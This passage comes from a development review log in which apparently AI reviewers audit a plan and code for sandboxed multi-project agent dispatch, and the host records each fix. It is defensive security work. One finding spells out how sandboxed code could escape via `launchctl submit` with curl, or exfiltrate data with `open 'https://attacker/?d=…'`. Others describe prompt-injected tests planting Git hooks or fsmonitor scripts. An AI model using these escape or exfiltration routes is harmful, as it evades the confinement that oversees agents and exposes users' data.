- MPD-R2 accepted: ignore checks use `check-ignore -v` provenance (a tracked, unmodified .gitignore inside the tree) for seeds and the startup guard. The draft projects.py already does this for seeds. Tests added for global-excludes and uncommitted-edit cases.
- MPD-R3 accepted: verified that LocalTracker loads tasks.json before taking its write-only _SAVE_LOCK (local_tracker.py:70,163). 4b now covers tasks.json and all its writers under one flock per transaction. Tests added.
- MPD-R4 accepted: old-generation completions stay in history but never update current status, tracker state, dispatch ownership or events. Test added.
- Plan amended; sha256 54f4d5393598b80a585ea1d42e1e60229daa43572b94376692fad2c4b7ad1069. Plan re-review = Round 12.

## Round 12 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r12/…/result.json` · session 01a1376d… · plan sha256 54f4d539… · 252 s · cross_provider · **REVISE** (1 high, 1 medium)
```json
{
 "verdict": "REVISE",
 "summary": "The amendments address the baseline cases, but tracker-write ordering and Git fingerprint coverage still have concrete gaps.",
 "findings": [
  {
   "id": "MPD-45",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:169",
   "evidence": "Checking a queued update’s generation does not fence an update already in flight. _push_linear sends In Review from a daemon thread (runner/modules/linear/__init__.py:1118–1138), while the Todo PATCH route independently calls update_issue_state (:905–906). An old update can pass its generation check, pause during state resolution or network I/O, then apply after the reset’s Todo update. Its subsequent fetch also replaces the cache and emits an event (:1139–1143). The new test covers completion after reset, not this ordering.",
   "fix": "Serialize state-changing tracker operations per issue, including resets, so an older in-flight operation finishes before the reset’s authoritative update. Check generation within that serialization and suppress stale cache/event publication. Add a test that delays an old In Review request while a Todo reset arrives."
  },
  {
   "id": "MPD-46",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:74",
   "evidence": "The fingerprint covers only <common>/config and the default hooks directory. A valid repository can already include <common>/extra.conf. An agent can change core.fsmonitor in that included file without changing either fingerprinted target or the working-tree diff. Hardened runner commands override it, so verification can succeed; the user’s later ordinary git status can execute the configured worktree script unsandboxed. Git also supports config.worktree and redirected hook directories. These configuration sources are documented in [Git configuration](https://git-scm.com/docs/git-config#_includes).",
   "fix": "Fingerprint all effective configuration source files writable by the agent, including included files and applicable config.worktree files, plus the effective hook directory. Alternatively reject unsupported configurations for confidential dispatch. Add a fixture with a pre-existing include whose fsmonitor setting changes without modifying the top-level config."
  }
 ],
 "coverage": [
  "Verified the plan SHA256 matches 54f4d5393598b80a585ea1d42e1e60229daa43572b94376692fad2c4b7ad1069.",
  "Inspected Phase 0 token, Host, Origin, fetch-wrapper and attachment-header implementation and its test source.",
  "Checked MPD-R1/R2 amendments against Git configuration, fingerprint and ignore-provenance requirements.",
  "Traced LocalTracker, raw cache synchronization and tasks.json writers against MPD-R3.",
  "Traced completion, asynchronous tracker pushes, direct reset mutations, cache replacement and event publication against MPD-R4."
 ],
 "limitations": [
  "Static review only; no edits, tests, live requests, browser checks, sandbox probes or delegation performed.",
  "The referenced draft projects.py was not present in the inspected checkout; later-phase helper behavior was assessed from the plan.",
  "Recorded browser checks and sandbox evidence were not independently reproduced."
 ]
}
```

### Host dispositions
- MPD-45 accepted: a per-issue lock around every state-changing tracker operation, with the generation checked inside it; a stale operation does nothing (no push, no cache replacement, no event). A test was added for a delayed in-flight push racing a reset.
- MPD-46 accepted, in a simpler form: the fingerprint hashes the effective `git config --list --show-origin --includes` plus the effective hooks dir (`git rev-parse --git-path hooks`), instead of enumerating config files. Tests added for an include-only fsmonitor change, config.worktree and a redirected core.hooksPath.
- Spike (2026-10-14, real CLIs, scratchpad evidence): Claude passed (a)-(e2). Codex passed (a),(c),(d),(e1) but CANNOT commit under any workspace-write variant (.git read-only: confidential flags, no writable_roots override, common dir as writable root, --approve-for-me). Resolution: the runner commits for sandboxed Codex runs (Decision 3a), with the old MPD-33 path repurposed; (b)/(f) were reworded to "the edit ends up committed". (f) auto-review approved an escalated curl with no hang, and the decision is visible in the JSON events. (g) sandbox-exec and (h) the hardened git helper passed locally; an unhardened git status did run a planted fsmonitor script.
- Revised plan sha256: b3fac94353cd885f9572a19ba4757eea7a2a1924fe8622fd44f223d59263a93a

## Round 13 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r13/…/result.json` · plan sha256 b3fac943… · 188 s · cross_provider · **REVISE** (1 high, 2 medium)
```json
{
 "verdict": "REVISE",
 "summary": "The tracker locking revision addresses MPD-45. Three concrete gaps remain in the Git fingerprint, automatic commits, and shared-state writer coverage.",
 "findings": [
  {
   "id": "MPD-47",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:74",
   "evidence": "The fingerprint discovers hooks with `git rev-parse --git-path hooks`, but every fingerprint command must pass through the helper that sets `core.hooksPath=/dev/null`. Git resolves this query using that override, so it returns /dev/null rather than the project's hooks directory. Listing it causes a snapshot error; treating it as empty leaves actual hooks unmonitored. This interaction is confirmed by [Git's path resolution source](https://github.com/git/git/blob/v2.49.0/path.c#L366-L381).",
   "fix": "Provide a narrowly scoped configuration-inspection mode that discovers the original hooks path without overriding core.hooksPath, while retaining confinement and other appropriate hardening. Test the complete fingerprint through the helper with both default and redirected hooks directories."
  },
  {
   "id": "MPD-48",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:85",
   "evidence": "The new unattended runner commit inherits `commit.gpgSign=true`. `--no-verify` disables hooks, not signing. A project using a locked signing key can require interactive authentication or fail under the confidential sandbox, preventing an otherwise successful Codex edit from reaching verify. [Git documents a separate signing override](https://git-scm.com/docs/git-commit#Documentation/git-commit.txt---no-gpg-sign).",
   "fix": "Define the runner's signing policy explicitly. For unsigned runner commits, pass --no-gpg-sign; otherwise require a supported non-interactive signing configuration. Bound commit execution with a timeout and process cleanup, and add a signing-enabled repository case."
  },
  {
   "id": "MPD-49",
   "severity": "medium",
   "path": "scripts/migrate_team_fields.py:35",
   "evidence": "Decision 4b omits this tasks.json writer. main() loads the complete file before a potentially slow Linear lookup, then _save_tasks() replaces it without the shared flock and uses the fixed tasks.tmp name. Running this CLI while the dashboard updates or creates a ticket can overwrite that update despite every listed writer adopting the new lock.",
   "fix": "Include the migration script in the shared transaction protocol. Fetch external mapping data first, then lock, reload current tasks, apply only migration fields, and replace through a unique temporary file. Add a migration-versus-dashboard writer case."
  }
 ],
 "coverage": [
  "Verified the on-disk plan matches SHA256 b3fac94353cd885f9572a19ba4757eea7a2a1924fe8622fd44f223d59263a93a.",
  "Reviewed the revised plan, prior dispositions, tracker reset/push callers, retry session selection, and the new Codex commit design.",
  "Inspected browser request guards, fetch wrapping, Socket.IO authentication, attachment headers, and security test source.",
  "Traced shared-state writers through app.py, run_skill.py, LocalTracker, Linear backup/comment paths, and utility scripts.",
  "Checked Git path-resolution source and commit documentation for the reported command interactions."
 ],
 "limitations": [
  "No files edited, tests executed, subprocess probes run, or work delegated.",
  "runner/projects.py is absent from this checkout; later phases were assessed as design requirements.",
  "Reported CLI spikes and browser checks were not independently reproduced; their scratchpad evidence was not inspected."
 ]
}
```

### Host dispositions
- MPD-47 accepted. The host had hit the same bug in the draft (the hooks lookup returned /dev/null) and fixed it: that one rev-parse runs with only core.fsmonitor=false. Draft tests cover the default and redirected hooks dirs through the helper.
- MPD-48 accepted: runner commits use --no-gpg-sign, a 60 s timeout and process-group cleanup. A test was added for a gpgSign=true repo.
- MPD-49 accepted, by deletion: the migration is applied (0 of 94 tasks lack team_id), so the one-off script is deleted rather than given the lock protocol. Re-checked other scripts: runner/dashboard.py only reads, and reduce_events.py and sync_state_runs.py do not touch these files.
- Revised plan sha256: 51481367088fc401158c9ca5987524787aca063ccf94905080638ffefb3a86b6

## Round 14 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r14/…/result.json` · 30 s · cross_provider · **APPROVED**, no findings. Bound to plan sha256 51481367088fc401158c9ca5987524787aca063ccf94905080638ffefb3a86b6; the approval check passed. 14/20 plan rounds used.

## Build — Phase 0 registry + Phase 1 view (2026-10-14)
- Commits dffb95f (projects.py), cd7bab3 (session view). Builder Claude. pytest 180 passed. Live: one R project passes sandboxed verify with seeds (0 fail / 1031 pass); the KB passes from the launchd runner context; one project is BLOCKED on a committed .gitignore; one was removed from the registry by user decision (2026-10-14 answers: seed the data; remove the project with the uncommitted verify target).

## Build inspection 2 — Codex, fresh session (2026-10-14)
- Result: `<session-scratchpad>/claudex/i2/…/result.json` · base a8ab382 · 235 s · cross_provider · **REVISE** (3 high, 7 medium)
```json
{
 "verdict": "REVISE",
 "summary": "The new registry, worktree and session-view implementation has material seed-safety, cleanup, locking and process-lifecycle defects. Registry and session parsing also have unhandled failure cases.",
 "findings": [
  {
   "id": "MPD-I2-01",
   "severity": "high",
   "path": "runner/projects.py:250",
   "evidence": "_ignored_by_committed_rule accepts any verbose check-ignore match whose source is a clean tracked .gitignore, without examining the pattern. A committed '!private.csv' rule therefore passes even though private.csv is explicitly unignored. Copied seed data can subsequently enter Git through ordinary git add -A. Git documents this distinction for verbose output: [git-check-ignore](https://git-scm.com/docs/git-check-ignore#Documentation/git-check-ignore.txt--v).",
   "fix": "Parse the matched pattern and reject negated rules. Use NUL-delimited output for provenance parsing, and add a case proving an explicitly unignored seed is rejected."
  },
  {
   "id": "MPD-I2-02",
   "severity": "high",
   "path": "runner/projects.py:364",
   "evidence": "committed_seeds parses git log filenames with whitespace splitting. A permitted seed such as 'private data' containing a committed 'private data/secret.csv' is split into separate tokens, neither matching the seed. Git-quoted non-ASCII paths are also compared without decoding. The safety check can consequently return no hits for committed confidential seed data.",
   "fix": "Request NUL-delimited filenames and compare complete decoded paths against seed boundaries. Cover spaces, non-ASCII characters and embedded newlines."
  },
  {
   "id": "MPD-I2-03",
   "severity": "high",
   "path": "runner/projects.py:324",
   "evidence": "Cleanup does not verify that the directory belongs to the selected project. It ignores git worktree remove failures and then recursively deletes the directory anyway. If a registry key is repointed from repository A to B while A's worktree remains, cleanup through B fails its Git removal but deletes A's worktree, including uncommitted work, and reports success.",
   "fix": "Validate the exact worktree ownership and binding before deletion. Preserve the directory and report an error when Git removal fails; do not use unconditional rmtree as a fallback or silently ignore branch-deletion failures."
  },
  {
   "id": "MPD-I2-04",
   "severity": "medium",
   "path": "runner/projects.py:465",
   "evidence": "Ownership validation accepts descendants of a worktree because _is_worktree_of compares only the common Git directory. Meanwhile _cmd_verify derives its lock from the supplied directory's basename. Verifying '<root>/demo/T-1/sub' therefore takes sub.lock and passes validation while a launch or cleanup holds T-1.lock. Verification and deletion can run concurrently on the same ticket.",
   "fix": "Require the supplied directory to equal the actual Git worktree top level and its recorded owned path. Derive the ticket lock from that validated binding, rejecting descendants and unregistered worktrees."
  },
  {
   "id": "MPD-I2-05",
   "severity": "medium",
   "path": "runner/projects.py:482",
   "evidence": "run_verify cleans up only after normal completion or TimeoutExpired. Pressing Ctrl-C during the verify CLI raises KeyboardInterrupt in the parent, releases ticket_lock, and leaves the verifier running in its separate session. Another verify or cleanup can then acquire the ticket while the original process continues writing. runner_commit similarly lacks unconditional cleanup on interruption and other exceptions.",
   "fix": "Put process-group termination and reaping in finally blocks for every launched verifier and runner commit, preserving the original exception and holding the ticket lock until cleanup finishes."
  },
  {
   "id": "MPD-I2-06",
   "severity": "medium",
   "path": "runner/projects.py:301",
   "evidence": "Worktree reuse reconstructs base_sha with merge-base against the current main HEAD instead of preserving the creation base. After main fast-forwards to the ticket branch, reuse returns the ticket tip as its base, hiding earlier ticket changes from base-relative verification and seed checks. Reuse also returns the expected branch name without checking the worktree's actual branch, and ignores merge-base failure.",
   "fix": "Persist the original worktree binding and base, reuse those values unchanged, and validate the actual repository and branch. Reject missing metadata, a changed branch or failed Git queries."
  },
  {
   "id": "MPD-I2-07",
   "severity": "medium",
   "path": "runner/projects.py:277",
   "evidence": "Source containment is checked only for the top-level seed path. For seed 'data', a nested 'data/shared' symlink pointing outside the project passes _seed_path, and copytree(symlinks=False) copies that external directory into the worktree. Unrelated private data can thus become available to a non-confidential project's agent despite the source-containment requirement.",
   "fix": "Validate every recursively followed source link against the project root before copying. Reject escaping targets and cycles, while continuing to materialize permitted links as independent files."
  },
  {
   "id": "MPD-I2-08",
   "severity": "medium",
   "path": "runner/projects.py:342",
   "evidence": "The advertised runner-commit timeout starts only after git add -A. That staging command uses _git's unbounded subprocess.run without an owned process group. A repository clean filter that hangs can hold the ticket lock indefinitely; the subsequent 60-second commit timeout never starts.",
   "fix": "Give runner-owned Git mutation commands bounded execution and process-group cleanup, including staging. Ensure timeout or filter failure preserves changes and produces a clear error."
  },
  {
   "id": "MPD-I2-09",
   "severity": "medium",
   "path": "runner/projects.py:160",
   "evidence": "Malformed YAML and registry read failures escape as yaml.YAMLError or OSError rather than ProjectError. Both /api/projects and the CLI catch only ProjectError, so an ordinary syntax error in projects.yaml produces HTTP 500 or a traceback instead of the promised actionable registry error.",
   "fix": "Translate registry read and YAML parsing failures into ProjectError with useful location information. Cover malformed YAML and an unreadable registry."
  },
  {
   "id": "MPD-I2-10",
   "severity": "medium",
   "path": "runner/projects.py:550",
   "evidence": "Session parsing assumes valid JSON also has the expected object and field types. A JSONL record such as [{\"type\":\"user\"}] reaches e.get on a list; a user message with string-valued message reaches _user_text's .get on a string. Either raises outside the OSError handler and aborts the entire /api/projects response, hiding other projects instead of degrading gracefully.",
   "fix": "Validate record and field types before use, isolate malformed records or session files, and preserve other projects' results. Add valid-JSON/wrong-shape fixtures alongside the existing invalid-JSON fixture."
  }
 ],
 "coverage": [
  "Verified all eight manifest file hashes and the changed-file set against the supplied base; the plan SHA256 matches.",
  "Reviewed the supplied plan, review-log changes, registry example, complete new projects module and both new test files, plus affected application and dashboard paths.",
  "Traced worktree creation, reuse, locking, seed copying, commit detection, fingerprinting, verification and cleanup.",
  "Traced related launch, retry, logging, tracker completion and shared-state writers in app.py, run_skill.py, LinearModule, LocalTracker and PTY handoffs; located the migration writer.",
  "Inspected existing browser request guards, attachment headers, fetch integration and session-cache behavior; consulted relevant SPEC.md lifecycle/concurrency requirements and Git ignore documentation."
 ],
 "limitations": [
  "Static review only: no files edited, tests run, runtime probes performed or work delegated.",
  "Private registry entries, project repositories and real session stores were not inspected; vendor-format compatibility and pilot readiness remain unverified.",
  "Recorded browser checks and sandbox spikes were not independently reproduced.",
  "Dispatch integration, redaction, shared-state serialization and terminal tabs remain unchecked plan phases; their absence was not treated as a regression in this increment."
 ]
}
```

### Host dispositions (all 10 accepted and fixed, each with a regression test)
- I2-01: check-ignore runs with `-v -z --stdin`; a negation pattern (`!x`) is rejected. Verified first: with -v, `!a.csv` exits 0.
- I2-02: committed_seeds reads `git log -z --name-only`; names with spaces, non-ASCII and newlines are tested.
- I2-03: remove_worktree requires an exact owned worktree, raises on `worktree remove` failure (the directory is kept), and drops the rmtree fallback. A branch -D failure raises.
- I2-04: `_is_worktree_of` requires the exact top level; `ticket_from_worktree` derives the lock id from the validated path (no deeper levels).
- I2-05: one `_run_bounded` (own process group, killed and reaped on timeout, error or KeyboardInterrupt) is used by every git call; run_verify kills its group in `finally`.
- I2-06: a binding file `<id>.json` (mode 600) holds the creation base, branch and project path; reuse validates all three plus the actual branch; missing metadata is an error.
- I2-07: `_check_seed_source` walks seed trees with followlinks; links that escape the root, dangling links and cycles are rejected.
- I2-08: staging and commit go through bounded `_git` (COMMIT_TIMEOUT_S); a hanging clean filter is tested; changes are preserved.
- I2-09: YAML and read errors become ProjectError ("cannot read registry").
- I2-10: wrong-shape JSON records and string messages are skipped per record; unexpected types drop one session, not the view.
- pytest: 193 passed.

## Build inspection 3 — Codex, fresh session (2026-10-14)
- Result: `<session-scratchpad>/claudex/i3/…/result.json` · base a8ab382 · snapshot 6d797ed · 234 s · cross_provider · **REVISE** (1 high, 6 medium, 1 low)
```json
{
 "verdict": "REVISE",
 "summary": "The revisions address several earlier findings, but seed detection, process cleanup, binding validation and session parsing still have concrete defects.",
 "findings": [
  {
   "id": "MPD-I3-01",
   "severity": "high",
   "path": "runner/projects.py:468",
   "evidence": "committed_seeds omits merge diffs. If an agent stages a seeded file while completing a merge and commits it only in the merge result, neither parent contains that file and this scan reports no hit. Confidential seed data can therefore pass the review guard. [Git documents that merge diffs are disabled by default](https://git-scm.com/docs/git-log#_diff_formatting).",
   "fix": "Explicitly inspect merge results against their parents while retaining traversal of ordinary commits. Add a case where only the merge commit introduces a seeded file."
  },
  {
   "id": "MPD-I3-02",
   "severity": "medium",
   "path": "runner/projects.py:469",
   "evidence": "The NUL-delimited parser still strips every leading newline from filenames. A permitted seed named '\\nprivate' becomes 'private' during comparison, so committing '\\nprivate/secret.csv' is missed. The regression fixture tests an embedded newline, which does not exercise this failure.",
   "fix": "Preserve filename bytes exactly and parse any Git record separators separately. Add a seed whose name starts with a newline."
  },
  {
   "id": "MPD-I3-03",
   "severity": "medium",
   "path": "runner/projects.py:113",
   "evidence": "_run_bounded kills the process group only when communicate raises. A successful clean filter can start a background writer with redirected standard streams and exit normally. Git then completes, this helper returns, and that writer survives staging, verification and ticket-lock release. A nonzero Git exit has the same gap.",
   "fix": "Terminate and reap the process group in a finally block on every outcome, preserving the command's original result. Cover successful and failed commands that leave background children."
  },
  {
   "id": "MPD-I3-04",
   "severity": "medium",
   "path": "runner/projects.py:383",
   "evidence": "ticket_from_worktree validates location and Git common directory but never reads binding metadata or checks the actual branch. After switching T-1's worktree to another branch, create_worktree correctly refuses reuse, yet the verify CLI still runs and can report pass for that other branch. Deleting the binding file likewise does not prevent verification.",
   "fix": "Share binding validation across reuse and verification. Under the ticket lock, require valid persisted metadata, the expected project and branch, and a valid creation base before running verify."
  },
  {
   "id": "MPD-I3-05",
   "severity": "medium",
   "path": "runner/projects.py:331",
   "evidence": "_check_seed_source uses a global visited-directory set as its cycle detector. A valid seed containing data/real/ and data/shortcut -> real visits the same directory twice and is rejected, although the link stays inside the project and creates no cycle. This contradicts the supported dereferenced-link behavior.",
   "fix": "Detect cycles against the current traversal's ancestor chain, allowing independent aliases to the same directory. Add an internal directory-symlink fixture."
  },
  {
   "id": "MPD-I3-06",
   "severity": "medium",
   "path": "runner/projects.py:676",
   "evidence": "Field-shape failures still escape the session parser. A user record with a valid cwd and object-valued entrypoint is returned by _claude_summary, then raises AttributeError at entrypoint.startswith. A non-string cwd fails similarly in _under. These exceptions escape api_projects's list comprehension and hide every project's sessions with HTTP 500.",
   "fix": "Validate cwd, entrypoint and other consumed field types before returning a summary, and isolate per-session failures. Extend the regression fixtures to malformed field values."
  },
  {
   "id": "MPD-I3-07",
   "severity": "medium",
   "path": "runner/projects.py:244",
   "evidence": "shlex.split does not separate shell operators here. For the valid command 'sh tests/new.sh;', the filename token is 'tests/new.sh;'. Even when tests/new.sh exists only as an untracked main-checkout file, the candidate appears nonexistent and is skipped. Worktree creation therefore bypasses the promised refusal for an uncommitted verify target.",
   "fix": "Validate targets using shell-aware tokenization or explicitly declared verify targets. Cover adjacent semicolons and && operators, and reject unsupported forms clearly."
  },
  {
   "id": "MPD-I3-08",
   "severity": "low",
   "path": "runner/projects.py:571",
   "evidence": "On timeout, run_verify discards output already consumed by communicate and then reads only remaining pipe bytes. A verifier that prints a diagnostic and sleeps can return an empty tail, losing the evidence needed to investigate its timeout. [Python recommends draining through communicate after termination](https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate).",
   "fix": "After killing the group, recover the complete captured output through communicate before taking the tail. Add a timeout case that prints a sentinel first."
  }
 ],
 "coverage": [
  "Verified all eight manifest file SHA256 values and the changed-file list against the supplied base.",
  "Reviewed the supplied plan, review-log changes, registry example, complete projects module, both new test files, and affected application/dashboard paths.",
  "Traced worktree ownership, binding persistence, ticket locking, seed copying, commit detection, Git hardening, fingerprinting, verification and cleanup.",
  "Inspected related launch, retry, reset, restore, completion and shared-state writers in app.py, run_skill.py, LinearModule, LocalTracker, PTY handoffs and the migration script.",
  "Inspected browser request guards, attachment headers, fetch integration, security test source and the shared session cache."
 ],
 "limitations": [
  "Static review only: no files edited, tests executed, runtime probes performed or work delegated.",
  "Private registry entries, project repositories, real session stores and recorded spike artifacts were not inspected.",
  "Spec fidelity was assessed against the supplied plan and constraints; SPEC.md was not inspected.",
  "Unchecked dispatch, redaction, shared-state serialization and terminal phases remain proposed work; their absence was not treated as a regression in this increment."
 ]
}
```

### Host dispositions (all 8 accepted and fixed, each with a regression test)
- I3-01/02: committed_seeds runs `diff-tree -r -m -z --name-only` per commit in base..HEAD, so merges are diffed against each parent and names keep their exact bytes. Tests: a seed introduced only by a merge; a seed named "\nprivate".
- I3-03: _run_bounded reaps the process group in `finally` on every outcome. Test: background children of a successful and a failed command.
- I3-04: one load_binding() validates the project path, branch, actual branch and base commit; used by reuse and run_verify (base defaults to the binding's). Test: a switched branch and a missing binding refuse verify.
- I3-05: cycle detection follows the ancestor chain; an internal alias to a sibling directory is allowed (test).
- I3-06: Claude fields must be strings; per-file and per-project failures are isolated (api_projects too). Codex cwd and updated are type-checked (test).
- I3-07: verify targets are tokenized with shlex punctuation_chars, so `;`, `&&` and `|` no longer hide a target (tests).
- I3-08: on timeout, communicate() is re-called after the kill, so output printed before the hang is kept (test).
- pytest: 204 passed.

## Build inspection 4 (2026-10-14)
- Codex attempt: failed after 3.7 s with "You've hit your usage limit … try again at Oct 15th, 2026 12:35 AM" (failure_kind=provider_unavailable, fallback_eligible). Automatic same-provider fallback per policy.
- Fallback result: `<session-scratchpad>/claudex/i4fb/…/result.json` · base a8ab382 · 306 s · **assurance degraded_same_provider** (Claude reviewing Claude-built code) · **REVISE** (1 high, 4 medium, 4 low)
```json
{
 "verdict": "REVISE",
 "summary": "Fallback review: the same provider built and planned this work, so this is not an independent cross-provider review. The Phase 0 registry/verify and Phase 1 session-view increment (runner/projects.py, /api/projects, project panel) fixes the earlier inspection findings. Several defects remain, though. The confidential sandbox profile is allow-default, so a process inside it can ask macOS services (launchd, LaunchServices) to act for it, which escapes the 'no network, no outside writes' boundary. The seed-leak scan misses root commits. The main-checkout fingerprint ignores branch switches, shared refs and skip-worktree flags. An interrupted worktree creation leaves a partly seeded worktree that later reuse accepts. The plan does not say that the closing fingerprint runs after verify, even though verify can write the shared git dir.",
 "findings": [
  {
   "id": "MPD-I4-01",
   "severity": "high",
   "path": "runner/projects.py:71",
   "evidence": "sandbox_profile emits '(version 1)(allow default)(deny network*)(deny file-write*)…'. With allow-default, mach-lookup/XPC, AppleEvents and LaunchServices stay allowed. Confidential verify runs agent-edited code under this profile (run_verify:580-583), and so do confined runner git commands, which can run repo-configured filters. That code can run `launchctl submit -l x -- /bin/sh -c 'curl …'`: launchd (outside the sandbox) starts an unsandboxed job with network and full write access. It can also run `open 'https://attacker/?d=…'` (LaunchServices hands the URL to the browser, which fetches it) or `osascript` to drive another app. Spike (g) and test_sandbox_prefix_blocks_outside_write only probe curl and a direct file write, so they cannot catch this. Decision 9/MPD-25 promise that verify gets 'no network and no writes outside the worktree' for confidential projects; this profile does not deliver that against prompt injection.",
   "fix": "Switch to a deny-default profile that allows only what git/sh/test runtimes need: file-read*, process-exec/fork, sysctl-read, and a minimal mach-lookup allow-list. At minimum, deny mach-lookup to launchd job submission, lsopen, appleevent-send and nsurlsessiond. Extend spike (g) and the tests with `launchctl submit`, `open https://…` and `osascript -e 'do shell script …'` probes that must fail. Keep 'refuse confidential dispatch' as the fallback."
  },
  {
   "id": "MPD-I4-02",
   "severity": "medium",
   "path": "runner/projects.py:486",
   "evidence": "committed_seeds runs `git diff-tree -r -m -z --name-only --no-commit-id <commit>` without `--root`. For a root (parentless) commit, diff-tree prints nothing. Scenario: on the ticket branch the agent runs `git checkout --orphan tmp`, `git add -f data/…`, commits, then `git branch -M tmp agent/T-1`. load_binding passes (right branch name, base still exists), rev-list base..HEAD returns the root commit, and diff-tree reports no names, so the seed data passes the 'seed committed' guard.",
   "fix": "Pass `--root` to diff-tree, or flag any commit in base..HEAD that is not a descendant of base. Add a regression test where only an orphan/root commit introduces a seed."
  },
  {
   "id": "MPD-I4-03",
   "severity": "medium",
   "path": "runner/projects.py:526",
   "evidence": "fingerprint hashes `rev-parse HEAD` (a SHA only), the diffs, untracked/ignored files, the config listing and the hooks dir. Three kinds of change go undetected: (a) `git checkout -b other` in the main checkout at the same commit (same SHA, same diffs), after which the user's next commit lands on the wrong branch, although the acceptance criterion says the main checkout's `git status` is unchanged; (b) changes to shared refs that every worktree sees: refs/stash (a `git stash drop`/`clear` run in the agent worktree deletes the user's stashes), other local branches and tags (`git branch -f release X`); (c) `git update-index --skip-worktree/--assume-unchanged` followed by an edit, which `git diff` hides.",
   "fix": "Also hash `git symbolic-ref -q HEAD` and `git for-each-ref` (excluding refs/heads/agent/* and remote-tracking refs if fetches are tolerated), including refs/stash, plus the `git ls-files -v` flag column. Add tests for a same-SHA branch switch, a stash drop and a skip-worktree edit."
  },
  {
   "id": "MPD-I4-04",
   "severity": "medium",
   "path": "runner/projects.py:432",
   "evidence": "create_worktree writes the binding JSON before _copy_seeds, and its cleanup handler only catches ProjectError. Raw exceptions are left uncaught: OSError from dest.parent.mkdir (:357), PermissionError from iterdir in _check_seed_source (:334), KeyboardInterrupt, or a runner restart. Each leaves a worktree with a valid binding and missing or unchecked seeds, and the CLI prints a traceback instead of the JSON error. On the next launch, the reuse branch (:417-422) calls only load_binding and _check_seed_destinations, then returns reused=True. The agent and verify then run without seed data, or with a copied seed that never passed _ignored_by_committed_rule.",
   "fix": "Write the binding, or a 'ready' marker, only after every seed is copied and checked. Have reuse require that marker and re-check that each seed exists and is ignored by committed rules. Wrap creation in try/except BaseException with remove_worktree, and turn OSError into ProjectError."
  },
  {
   "id": "MPD-I4-05",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:128",
   "evidence": "Confidential verify (run_verify → confine_for(project, wt)) and confined runner git commands may write anywhere in the git common dir, including config, hooks/, info/attributes and refs. Decision 1 says only 'before and after each run', and the Phase 2 checkbox lists verify, fingerprint and shortstat without an order. If the closing snapshot is taken right after the agent exits, a prompt-injected test can plant `.git/hooks/post-checkout` or `core.fsmonitor` during verify, or a filter can do it during runner_commit's `git add -A`. Neither is detected, and the user's later unsandboxed git commands run it, which is the MPD-R1 scenario.",
   "fix": "State in the plan, and test, that the closing fingerprint is taken after runner_commit, committed_seeds and verify, and that a mismatch fails the run. Also consider narrowing verify's writable roots to <common>/worktrees/<id> (plus objects only if needed) instead of the whole common dir."
  },
  {
   "id": "MPD-I4-06",
   "severity": "low",
   "path": "runner/projects.py:585",
   "evidence": "run_verify waits with communicate(), which returns only on stdout EOF. If a verify exits 0 but leaves a background child that inherited stdout (a test server or watcher), the run is reported as 'timeout' (exit 124) after verify_timeout_s instead of 'pass'. If that child left the process group (setsid/double-fork daemon), the second `proc.communicate()` (:595) has no timeout and blocks forever while the caller holds the ticket lock.",
   "fix": "Read the pipe in a thread into a bounded buffer and use proc.wait(timeout) for the exit status. Then kill the group, close the pipe, and join the reader with a timeout. Add a test where verify exits 0 with `sleep 30 &` still holding stdout."
  },
  {
   "id": "MPD-I4-07",
   "severity": "low",
   "path": "runner/projects.py:174",
   "evidence": "Several inputs can still make /api/projects return 500 for every project, contrary to the Phase 1 claim that one failing entry never hides the others. load_registry(errors=…) only isolates ProjectError: `Path('~nouser/x').expanduser()` raises RuntimeError, and a seed or path string with an embedded NUL makes `exists()` raise ValueError. Session fields are not fully type-checked: customTitle/aiTitle (:662-664) and Codex name/title/id (:741) can be non-string, and a BLOB (bytes) value reaches jsonify outside the per-project try in app.py api_projects. The copied resume commands also interpolate f.stem and the Codex thread id without shlex.quote (:706, :743).",
   "fix": "Catch Exception per entry in load_registry (as ProjectError text), require string title/id fields in both readers, and shlex.quote the session ids in the resume commands. Add fixtures for '~nouser', a dict customTitle and a BLOB Codex name."
  },
  {
   "id": "MPD-I4-08",
   "severity": "low",
   "path": "runner/projects.py:312",
   "evidence": "Decision 1 says runner diff commands pass `--no-ext-diff --no-textconv`. The `diff --quiet HEAD -- <.gitignore>` in _ignored_by_committed_rule and the `diff --cached --quiet` in runner_commit (:469) pass only --no-ext-diff. For non-confidential projects, these run unconfined.",
   "fix": "Add --no-textconv to every diff invocation, ideally inside the helper whenever args[0] is diff."
  },
  {
   "id": "MPD-I4-09",
   "severity": "low",
   "path": "runner/projects.py:383",
   "evidence": "Worktrees (<key>/<id>/), lock files (<key>/<id>.lock) and bindings (<key>/<id>.json) share one namespace, and _IDENT allows '.json' and '.lock' suffixes. Scenario: ticket 'T-1.json' is created first as a directory. A later create_worktree for 'T-1' then fails at os.open of the binding with IsADirectoryError, a raw OSError the ProjectError handler does not catch, and leaves an orphaned worktree and branch.",
   "fix": "Keep sidecars in a separate subdirectory (e.g. <key>/.meta/), or reject idents ending in .json/.lock."
  }
 ],
 "coverage": [
  "Read the plan, the full on-disk runner/projects.py (matches the diff), the projects.example.yaml diff, the app.py /api/projects diff, the index.html project-panel diff, and both new test files in the diff.",
  "Checked the removed skill-card JS for leftover references (selectedSkill, _renderSkillPanel, skill-panel-content): none remain; the skill_selected server handler is untouched.",
  "Checked that _esc escapes double quotes (index.html:1755), so the project/session attributes are safely escaped.",
  "Checked usage_reader._cached_by_stat semantics and that the .gitignore entry for projects.yaml exists.",
  "Traced seed copy and validation, ignore provenance, committed-seed detection, worktree create/reuse/remove, the binding, the ticket lock, the bounded git helper, fingerprint coverage, runner_commit, run_verify, the sandbox profile, and the session readers."
 ],
 "limitations": [
  "Same-provider fallback review: not cross-provider independent.",
  "Static review only: no tests run, no subprocess or sandbox-exec probes, no files edited. The sandbox-escape finding (I4-01) is based on known macOS allow-default Seatbelt behaviour and has not been reproduced here.",
  "Manifest SHA256 values were not recomputed; the projects.py content was confirmed to match the diff by reading it.",
